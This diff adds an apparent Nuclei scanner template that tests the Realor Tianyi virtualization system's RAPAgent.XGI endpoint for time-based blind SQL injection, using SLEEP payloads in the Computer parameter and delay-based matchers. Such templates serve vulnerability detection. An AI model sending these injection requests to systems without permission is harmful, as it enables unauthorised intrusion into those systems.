@@ -1,0 +1,37 @@
+id: realor-rapagent-sqli
+
+info:
+  name: 瑞友天翼虚拟化系统 RAPAgent SQL注入
+  author: SleepingBag945
+  severity: high
+
+
+http:
+  - raw:
+      - |
+        GET /RAPAgent.XGI?CMD=GETApplication&AppID=APP00000003&Language=ZH-CN&User=admin&PWD=e10adc3949ba59abbe56e057f20f883e&AuthType=0&Computer=CMD=GETApplication&AppID=APP00000001&Language=ZH-CN&User=admin&PWD=e10adc3949ba59abbe56e057f20f883e&AuthType=0&Computer=WIN-1TLJMBOFIT6%27%20AND%20(SELECT%209990%20FROM%20(SELECT(SLEEP(1)))Joqo)%20AND%20%27DseX%27=%27DseX&Finger=A45A2E5E3&IP=&Finger=A45A2E5E3&IP= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip
+
+
+      - |
+        GET /RAPAgent.XGI?CMD=GETApplication&AppID=APP00000003&Language=ZH-CN&User=admin&PWD=e10adc3949ba59abbe56e057f20f883e&AuthType=0&Computer=CMD=GETApplication&AppID=APP00000001&Language=ZH-CN&User=admin&PWD=e10adc3949ba59abbe56e057f20f883e&AuthType=0&Computer=WIN-1TLJMBOFIT6%27%20AND%20(SELECT%209990%20FROM%20(SELECT(SLEEP(2)))Joqo)%20AND%20%27DseX%27=%27DseX&Finger=A45A2E5E3&IP=&Finger=A45A2E5E3&IP= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip
+
+
+      - |
+        GET /RAPAgent.XGI?CMD=GETApplication&AppID=APP00000003&Language=ZH-CN&User=admin&PWD=e10adc3949ba59abbe56e057f20f883e&AuthType=0&Computer=CMD=GETApplication&AppID=APP00000001&Language=ZH-CN&User=admin&PWD=e10adc3949ba59abbe56e057f20f883e&AuthType=0&Computer=WIN-1TLJMBOFIT6%27%20AND%20(SELECT%209990%20FROM%20(SELECT(SLEEP(3)))Joqo)%20AND%20%27DseX%27=%27DseX&Finger=A45A2E5E3&IP=&Finger=A45A2E5E3&IP= HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Encoding: gzip
+
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=2  && duration_1<=4"
+          - "duration_2>=4  && duration_2<=6"
+          - "duration_3>=6  && duration_3<=8"
